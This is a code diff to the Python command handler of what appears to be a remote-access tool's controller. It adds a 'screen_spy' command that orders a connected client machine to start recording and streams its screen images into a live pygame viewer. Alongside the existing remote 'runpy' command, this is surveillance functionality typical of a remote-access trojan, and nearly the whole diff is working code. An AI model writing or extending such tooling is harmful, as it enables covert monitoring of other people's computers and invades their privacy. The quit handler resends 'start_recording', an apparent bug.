@@ -1,10 +1,14 @@
-from typing import TYPE_CHECKING, Callable, Optional
+from typing import TYPE_CHECKING, Callable, Optional, Union
 from time import sleep as time_sleep
 from loguru import logger
-from os import listdir
+from os import listdir, environ
+from threading import Thread
+from zlib import decompress
+from io import BytesIO
 
 if TYPE_CHECKING:
     from .bucket import ConnectionBucket
+    from .device import ClientDevice
     from sock import NetterServer
 
 class Command:
@@ -137,6 +141,46 @@ class CommandHandler:
         self.NetServer._waitingForResponse = True
 
         while self.NetServer._waitingForResponse: time_sleep(1)
+
+    @command(['screen_spy', 'spy'], accept_args = True)
+    def screen_spying(self, *clientID) -> None:
+        selectedClient: Union['ClientDevice', None] = self.NetServer._selectedClient \
+            if self.NetServer._selectedClient else self.bucket.get_client_by_id(clientID)
+
+        environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
+        pygame = __import__('pygame')
+
+        if (selectedClient == None):
+            logger.error('Missing argument: Client Unique ID')
+            return
+
+        selectedClient.socket.send_packet('start_recording')
+        selectedClient.stillRecording = True
+        running = True
+
+        def receive_and_display(screen) -> None:
+            while running:
+                data = decompress(selectedClient.socket.receive_packet())
+
+                img = pygame.image.load(BytesIO(data))
+                img = pygame.transform.scale(img, (screen_width, screen_height))
+                screen.blit(img, (0, 0))
+                pygame.display.update()
+
+        pygame.init()
+        screen_width, screen_height = 1280, 720
+        screen = pygame.display.set_mode((screen_width, screen_height))
+
+        Thread(target = receive_and_display, args = (screen,)).start()
+
+        while running:
+            for event in pygame.event.get():
+                if event.type == pygame.QUIT:
+                    selectedClient.socket.send_packet('start_recording')
+                    running = False
+
+        selectedClient.stillRecording = False
+        pygame.quit()
 
     @command(['runpy'], accept_args = True)
     def run_script(self, *fileName) -> None:
